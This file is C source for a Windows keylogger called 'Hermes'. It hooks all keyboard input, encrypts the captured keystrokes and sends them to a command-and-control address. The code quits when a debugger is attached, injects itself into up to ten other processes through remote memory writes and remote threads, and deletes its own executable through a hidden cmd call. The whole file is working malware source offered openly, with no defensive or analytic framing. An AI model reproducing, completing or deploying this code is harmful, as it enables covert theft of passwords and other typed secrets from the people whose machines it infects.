#include <WinSock2.h>
#include <strsafe.h>
#include "alphatools.h"
#include <Psapi.h>
#include <TlHelp32.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <wchar.h>

//Change accordingly.
#define LOG_BUFFER_SIZE 512
#define C2_LISTENING_PORT 80
#define SECRET_SIZE 5
#define C2_PUBLIC_ADDRESS "127.0.0.1"
#define DEFAULT_EXIT_STATUS 1
#define ERROR_EXIT_STATUS -1
#define LOGGED_KEY_BUF_SIZE 15
#define TARGET_PROC_LIMIT 10 //The more processes we infect, the higher chance of success, 
			     //but it's also more likely to draw attention on the network.

BOOL presentInList(DWORD procID);
DWORD HermesCore();
VOID ExfiltrateKeys();
PCHAR TranslateVKCode(INT vkCode);
BOOL SetHook();
BOOL Cleanup(DWORD dwControlType);
INT injectProcess(DWORD* processIDs, DWORD numActive);
VOID SelfDestruct();
VOID MoveOut();
void __stdcall mainCRTStartup();

HHOOK kHook;
PCHAR Key = 0x0;
PCHAR LogBuffer = 0x0;
INT listCount;
DWORD targetProcs[TARGET_PROC_LIMIT];

typedef struct BASE_RELOCATION_RECORD {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_RECORD, * PBASE_RELOCATION_RECORD;


BOOL presentInList(DWORD procID) {
	for (int i = 0; i < listCount; i++) {
		if (procID == targetProcs[i]) return TRUE;
	}

	return FALSE;
}

DWORD HermesCore() {

	if (IsDebuggerPresent()) ExitProcess(DEFAULT_EXIT_STATUS);

	MSG message;

	LogBuffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LOG_BUFFER_SIZE);

	Key = GenerateKey();

	SecureZeroMemory(LogBuffer, LOG_BUFFER_SIZE);

	AlphaCrypt(Key, LogBuffer, LOG_BUFFER_SIZE);

	if (!SetConsoleCtrlHandler(Cleanup, TRUE)) ExitProcess(DEFAULT_EXIT_STATUS);

	if (!SetHook()) ExitProcess(DEFAULT_EXIT_STATUS);

	while (GetMessage(&message, NULL, 0x0, 0x0));

	return 0;
}

VOID ExfiltrateKeys() {
	WSADATA winSockData;
	struct sockaddr_in addr;
	SOCKET sockfd;
	CHAR Secret[SECRET_SIZE];
	BOOL Success = TRUE;

	Secret[0] = '3';
	Secret[1] = '1';
	Secret[2] = '3';
	Secret[3] = '3';
	Secret[4] = '7';

	WSAStartup(MAKEWORD(2, 2), &winSockData);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if (sockfd == INVALID_SOCKET) {
		Success = FALSE;
		goto end;
	}

#pragma warning(suppress : 4996)
	addr.sin_addr.s_addr = inet_addr(C2_PUBLIC_ADDRESS);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(C2_LISTENING_PORT);

	if (connect(sockfd, (const struct sockaddr_in*)&addr, sizeof(addr))) {
		MoveOut();

		Success = FALSE;
		goto socket_epilogue;
	}

	send(sockfd, &Secret, SECRET_SIZE, 0);

	send(sockfd, Key, KEY_SIZE, 0);

	send(sockfd, LogBuffer, LOG_BUFFER_SIZE, 0);

socket_epilogue:
	closesocket(sockfd);
	WSACleanup();

end:
	SecureZeroMemory(&Secret, 5);
	if (!Success) {
		ExitProcess(DEFAULT_EXIT_STATUS);
	}
	return;
}

PCHAR TranslateVKCode(INT vkCode) {
	PCHAR result = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LOGGED_KEY_BUF_SIZE);

	PCHAR helperPchar;

	SecureZeroMemory(result, 15);


	switch (vkCode) {
	case (0x1):
		result[0] = '['; result[1] = 'L'; result[2] = 'C'; result[3] = 'L'; result[4] = 'I'; result[5] = 'C'; result[6] = 'K'; result[7] = ']';
		break;
	case (0x2):
		result[0] = '['; result[1] = 'R'; result[2] = 'C'; result[3] = 'L'; result[4] = 'I'; result[5] = 'C'; result[6] = 'K'; result[7] = ']';
		break;
	case (0x4):
		result[0] = '['; result[1] = 'M'; result[2] = 'C'; result[3] = 'L'; result[4] = 'I'; result[5] = 'C'; result[6] = 'K'; result[7] = ']';
		break;
	case (0x8):
		result[0] = '['; result[1] = 'B'; result[2] = 'A'; result[3] = 'C'; result[4] = 'K'; result[5] = ']';
		break;
	case (0x9):
		result[0] = '['; result[1] = 'T'; result[2] = 'A'; result[3] = 'B'; result[4] = ']';
		break;
	case (0xC):
		result[0] = '['; result[1] = 'C'; result[2] = 'L'; result[3] = 'E'; result[4] = 'A'; result[5] = 'R'; result[6] = ']';
		break;
	case (0xD):
		result[0] = '['; result[1] = 'R'; result[2] = 'T'; result[3] = 'R'; result[4] = 'N'; result[5] = ']'; result[6] = '\n';
		break;
	case (0x10):
		result[0] = '['; result[1] = 'S'; result[2] = 'H'; result[3] = 'I'; result[4] = 'F'; result[5] = 'T'; result[6] = ']';
		break;
	case (0x11):
		result[0] = '['; result[1] = 'C'; result[2] = 'T'; result[3] = 'R'; result[4] = 'L'; result[5] = ']';
		break;
	case (0x12):
		result[0] = '['; result[1] = 'A'; result[2] = 'L'; result[3] = 'T'; result[4] = ']';
		break;
	case (0x13):
		result[0] = '['; result[1] = 'P'; result[2] = 'A'; result[3] = 'U'; result[4] = 'S'; result[5] = 'E'; result[6] = ']';
		break;
	case (0x14):
		result[0] = '['; result[1] = 'C'; result[2] = 'A'; result[3] = 'P'; result[4] = 'S'; result[5] = ']';
		break;
	case (0x1B):
		result[0] = '['; result[1] = 'E'; result[2] = 'S'; result[3] = 'C'; result[4] = ']';
		break;
	case (0x20):
		result[0] = '['; result[1] = 'S'; result[2] = 'P'; result[3] = 'A'; result[4] = 'C'; result[5] = 'E'; result[6] = ']';
		break;
	case (0x21):
		result[0] = '['; result[1] = 'P'; result[2] = 'A'; result[3] = 'G'; result[4] = 'E'; result[5] = ' '; result[6] = 'U'; result[7] = 'P'; result[8] = ']';
		break;
	case (0x22):
		result[0] = '['; result[1] = 'P'; result[2] = 'A'; result[3] = 'G'; result[4] = 'E'; result[5] = ' '; result[6] = 'D'; result[7] = 'O'; result[8] = 'W'; result[9] = 'N'; result[10] = ']';
		break;
	case (0x23):
		result[0] = '['; result[1] = 'E'; result[2] = 'N'; result[3] = 'D'; result[4] = ']';
		break;
	case (0x24):
		result[0] = '['; result[1] = 'H'; result[2] = 'O'; result[3] = 'M'; result[4] = 'E'; result[5] = ']';
		break;
	case (0x25):
		result[0] = '['; result[1] = 'L'; result[2] = 'E'; result[3] = 'F'; result[4] = 'T'; result[5] = ']';
		break;
	case (0x26):
		result[0] = '['; result[1] = 'U'; result[2] = 'P'; result[3] = ']';
		break;
	case (0x27):
		result[0] = '['; result[1] = 'R'; result[2] = 'I'; result[3] = 'G'; result[4] = 'H'; result[5] = 'T'; result[6] = ']';
		break;
	case (0x28):
		result[0] = '['; result[1] = 'D'; result[2] = 'O'; result[3] = 'W'; result[4] = 'N'; result[5] = ']';
		break;
	case (0x29):
		result[0] = '['; result[1] = 'S'; result[2] = 'E'; result[3] = 'L'; result[4] = ']';
		break;
	case (0x2A):
		result[0] = '['; result[1] = 'P'; result[2] = 'R'; result[3] = 'I'; result[4] = 'N'; result[5] = 'T'; result[6] = ']';
		break;
	case (0x2C):
		result[0] = '['; result[1] = 'P'; result[2] = 'R'; result[3] = 'T'; result[4] = 'S'; result[5] = 'C'; result[6] = ']';
		break;
	case (0x2B):
		result[0] = '['; result[1] = 'E'; result[2] = 'X'; result[3] = 'I'; result[4] = 'T'; result[5] = ']';
		break;
	case (0x2D):
		result[0] = '['; result[1] = 'I'; result[2] = 'N'; result[3] = 'S'; result[4] = ']';
		break;
	case (0x2E):
		result[0] = '['; result[1] = 'D'; result[2] = 'E'; result[3] = 'L'; result[4] = ']';
		break;
	case (0x2F):
		result[0] = '['; result[1] = 'H'; result[2] = 'L'; result[3] = 'P'; result[4] = ']';
		break;
	case (0x5B):
		result[0] = '['; result[1] = 'L'; result[2] = 'W'; result[3] = 'I'; result[4] = 'N'; result[5] = ']';
		break;
	case (0x5C):
		result[0] = '['; result[1] = 'R'; result[2] = 'W'; result[3] = 'I'; result[4] = 'N'; result[5] = ']';
		break;
	case (0x5D):
		result[0] = '['; result[1] = 'A'; result[2] = 'P'; result[3] = 'P'; result[4] = 'S'; result[5] = ']';
		break;
	case (0x5F):
		result[0] = '['; result[1] = 'S'; result[2] = 'L'; result[3] = 'E'; result[4] = 'E'; result[5] = 'P'; result[6] = ']';
		break;
	case (0x6A):
		result[0] = '['; result[1] = '*'; result[2] = ']';
		break;
	case (0x6B):
		result[0] = '['; result[1] = '+'; result[2] = ']';
		break;
	case (0x6C):
		result[0] = '['; result[1] = 'S'; result[2] = 'E'; result[3] = 'P'; result[4] = ']';
		break;
	case (0x6D):
		result[0] = '['; result[1] = 'S'; result[2] = 'U'; result[3] = 'B'; result[4] = ']';
		break;
	case (0x6E):
		result[0] = '['; result[1] = 'D'; result[2] = 'E'; result[3] = 'C'; result[4] = ']';
		break;
	case (0x6F):
		result[0] = '['; result[1] = 'D'; result[2] = 'I'; result[3] = 'V'; result[4] = ']';
		break;
	case (0x90):
		result[0] = '['; result[1] = 'N'; result[2] = 'U'; result[3] = 'M'; result[4] = 'L'; result[5] = 'O'; result[6] = 'C'; result[7] = 'K'; result[8] = ']';
		break;
	case (0x91):
		result[0] = '['; result[1] = 'S'; result[2] = 'C'; result[3] = 'R'; result[4] = 'O'; result[5] = 'L'; result[6] = 'L'; result[7] = ']';
		break;
	case (0xA0):
		result[0] = '['; result[1] = 'L'; result[2] = 'S'; result[3] = 'H'; result[4] = 'I'; result[5] = 'F'; result[6] = 'T'; result[7] = ']';
		break;
	case (0xA1):
		result[0] = '['; result[1] = 'R'; result[2] = 'S'; result[3] = 'H'; result[4] = 'I'; result[5] = 'F'; result[6] = 'T'; result[7] = ']';
		break;
	case (0xA2):
		result[0] = '['; result[1] = 'L'; result[2] = 'C'; result[3] = 'T'; result[4] = 'R'; result[5] = 'L'; result[6] = ']';
		break;
	case (0xA3):
		result[0] = '['; result[1] = 'R'; result[2] = 'C'; result[3] = 'T'; result[4] = 'R'; result[5] = 'L'; result[6] = ']';
		break;
	case (0xA4):
		result[0] = '['; result[1] = 'L'; result[2] = 'R'; result[3] = 'E'; result[4] = 'T'; result[5] = 'N'; result[6] = ']';
		break;
	case (0xA5):
		result[0] = '['; result[1] = 'R'; result[2] = 'R'; result[3] = 'E'; result[4] = 'T'; result[5] = 'N'; result[6] = ']';
		break;
	case (0xBA):
		result[0] = '['; result[1] = ';'; result[2] = '/'; result[3] = ':'; result[4] = ']';
		break;
	case (0xBB):
		result[0] = '['; result[1] = '+'; result[2] = ']';
		break;
	case (0xBC):
		result[0] = '['; result[1] = ','; result[2] = '/'; result[3] = '<'; result[4] = ']';
		break;
	case (0xBD):
		result[0] = '['; result[1] = '_'; result[2] = '/'; result[3] = '-'; result[4] = ']';
		break;
	case (0xBE):
		result[0] = '['; result[1] = '.'; result[2] = '/'; result[3] = '>'; result[4] = ']';
		break;
	case (0xBF):
		result[0] = '['; result[1] = '/'; result[2] = '/'; result[3] = '?'; result[4] = ']';
		break;
	case (0xC0):
		result[0] = '['; result[1] = '`'; result[2] = '/'; result[3] = '~'; result[4] = ']';
		break;
	case (0xDB):
		result[0] = '['; result[1] = '['; result[2] = '/'; result[3] = '{'; result[4] = ']';
		break;
	case (0xDC):
		result[0] = '['; result[1] = '\\'; result[2] = '/'; result[3] = '|'; result[4] = ']';
		break;
	case (0xDD):
		result[0] = '['; result[1] = ']'; result[2] = '/'; result[3] = '}'; result[4] = ']';
		break;
	case (0xDE):
		result[0] = '['; result[1] = '\''; result[2] = '/'; result[3] = '\"'; result[4] = ']';
		break;
	default:
		if ((vkCode > 0x2F && vkCode < 0x5B) && !(vkCode >= 0x30 && vkCode <= 0x40)) {
			result[0] = (CHAR)vkCode;
		}
		else if ((vkCode >= 0x60 && vkCode <= 0x69) || (vkCode > 0x2E && vkCode < 0x3A)) {
			result[0] = (vkCode > 0x3A) ? (CHAR)(vkCode - 0x30) : (CHAR)(vkCode);
		}
		else if (vkCode >= 0x70 && vkCode <= 0x87) {
			helperPchar = (PCHAR)VirtualAlloc(NULL, 3, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			SecureZeroMemory(helperPchar, 3);

			helperPchar[0] = vkCode - 0x3F;

			result[0] = '['; result[1] = 'F';

			switch (helperPchar[0]) {
			case 0x3A:
				result[2] = '1'; result[3] = '0'; result[4] = ']';
				break;
			case 0x3B:
				result[2] = '1'; result[3] = '1'; result[4] = ']';
				break;
			case 0x3C:
				result[2] = '1'; result[3] = '2'; result[4] = ']';
				break;
			default:
				result[2] = helperPchar[0]; result[3] = ']';
			}

			SecureZeroMemory(helperPchar, 3);

			VirtualFree(helperPchar, 0, MEM_RELEASE);
		}
		else {
			result[0] = '['; result[1] = '-'; result[2] = ']';
		}
	}

	return result;
}

LRESULT Deposit(int Code, WPARAM wParam, LPARAM lParam) {
	if ((Code > -1) && (wParam == WM_KEYDOWN)) {
		KBDLLHOOKSTRUCT* KeyBoardHookStruct = (KBDLLHOOKSTRUCT*)lParam;
		HANDLE ProcHeap = GetProcessHeap();

		if (IsDebuggerPresent()) ExitProcess(DEFAULT_EXIT_STATUS);

		PCHAR key = TranslateVKCode(KeyBoardHookStruct->vkCode);

		AlphaCrypt(Key, LogBuffer, LOG_BUFFER_SIZE);

		StringCbCatA(LogBuffer, LOG_BUFFER_SIZE, key);

		if (strlen(LogBuffer) > LOG_BUFFER_SIZE - 0x10) {
			AlphaCrypt(Key, LogBuffer, LOG_BUFFER_SIZE);
			ExfiltrateKeys();
			SecureZeroMemory(LogBuffer, LOG_BUFFER_SIZE);
			SecureZeroMemory(Key, KEY_SIZE);
			HeapFree(ProcHeap, 0, Key);
			Key = GenerateKey();
		}

		AlphaCrypt(Key, LogBuffer, LOG_BUFFER_SIZE);

		SecureZeroMemory(key, 15);

		HeapFree(ProcHeap, 0, key);
	}

	CallNextHookEx(kHook, Code, wParam, lParam);
}

BOOL SetHook() {

	kHook = SetWindowsHookEx(WH_KEYBOARD_LL, Deposit, NULL, 0);

	return ((kHook) ? TRUE : FALSE);
}

BOOL Cleanup(DWORD dwControlType) {
	HANDLE ProcHeap;

	if ((dwControlType == CTRL_BREAK_EVENT || dwControlType == CTRL_C_EVENT || dwControlType == CTRL_CLOSE_EVENT)
		&& (Key && LogBuffer)) {

		ProcHeap = GetProcessHeap();

		SecureZeroMemory(Key, KEY_SIZE);
		SecureZeroMemory(LogBuffer, LOG_BUFFER_SIZE);

		HeapFree(ProcHeap, 0, Key);
		HeapFree(ProcHeap, 0, LogBuffer);

		UnhookWindowsHookEx(kHook);
	}

	return FALSE;
}

INT injectProcess(DWORD* processIDs, DWORD numActive) {
	HANDLE victimProc = NULL;
	PVOID imageBase = GetModuleHandle(NULL);
	UINT i = 0;
	DWORD procCandidate;
	BOOL candidateFound = FALSE;
	PVOID victimProcessImage = NULL;
	DWORD ProcessId = GetCurrentProcessId();
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	PVOID currentProcessImage = VirtualAlloc(NULL, (DWORD)(ntHeader->OptionalHeader.SizeOfImage), MEM_COMMIT, PAGE_READWRITE);

	if (currentProcessImage == NULL) {
		ExitProcess(ERROR_EXIT_STATUS);

	}

	CopyMemory(currentProcessImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	while (!candidateFound) {
		procCandidate = processIDs[i];
		if (procCandidate != ProcessId && procCandidate > 7500 && !presentInList(procCandidate)) {
			victimProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, procCandidate);
			victimProcessImage = VirtualAllocEx(victimProc, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (victimProcessImage && victimProc) {
				candidateFound = TRUE;
				targetProcs[listCount++] = procCandidate;
			}
		}

		i++;

		if (i == numActive) {
			return -1;
		}
	}

	DWORD_PTR imageBaseDelta = (DWORD_PTR)victimProcessImage - (DWORD_PTR)imageBase;
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)currentProcessImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationCount = 0;
	PDWORD_PTR newAddr;
	PBASE_RELOCATION_RECORD relocationRecord = NULL;

	while (relocationTable->SizeOfBlock > 0) {
		relocationCount = ((relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT));
		relocationRecord = (PBASE_RELOCATION_RECORD)(relocationTable + 1);

		for (short a = 0; a < relocationCount; a++) {
			if (relocationRecord[a].Offset) {
				newAddr = (PDWORD_PTR)((DWORD_PTR)currentProcessImage + relocationTable->VirtualAddress + relocationRecord[a].Offset);
				*newAddr += imageBaseDelta;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	if (!WriteProcessMemory(victimProc, victimProcessImage, currentProcessImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
		ExitProcess(ERROR_EXIT_STATUS);
	}

	CreateRemoteThread(victimProc, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)HermesCore + imageBaseDelta), NULL, 0, NULL);

	SecureZeroMemory(currentProcessImage, ntHeader->OptionalHeader.SizeOfImage);
	victimProc = NULL;
	victimProcessImage = NULL;

	return processIDs[--i];
}

VOID SelfDestruct() {
	HINSTANCE retVal = ShellExecute(NULL, L"open", L"cmd", L"/c ping localhost -n 3 & del .\\Hermes.exe", NULL, SW_HIDE);
	ExitProcess(DEFAULT_EXIT_STATUS);
}

VOID MoveOut() {
	DWORD AllProcessesIDs[10000], nActiveProcesses, nProcessesReturned;

	if (!EnumProcesses(AllProcessesIDs, sizeof(AllProcessesIDs), &nProcessesReturned)) {
		ExitProcess(DEFAULT_EXIT_STATUS);
	}

	listCount = 0;

	nActiveProcesses = nProcessesReturned / sizeof(DWORD);

	while (injectProcess(AllProcessesIDs, nActiveProcesses) > -1 && listCount < TARGET_PROC_LIMIT );
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	WCHAR szFileName[MAX_PATH];

	GetModuleFileName(NULL, szFileName, MAX_PATH);

	if (wcsstr(szFileName, L"Hermes.exe")) {
		MoveOut();
		SelfDestruct();
	}
	else {
		HermesCore();
	}

	return 0;
}

void __stdcall mainCRTStartup()
{
	int Result = WinMain(GetModuleHandle(0), 0, 0, SW_HIDE);
	ExitProcess(Result);
}


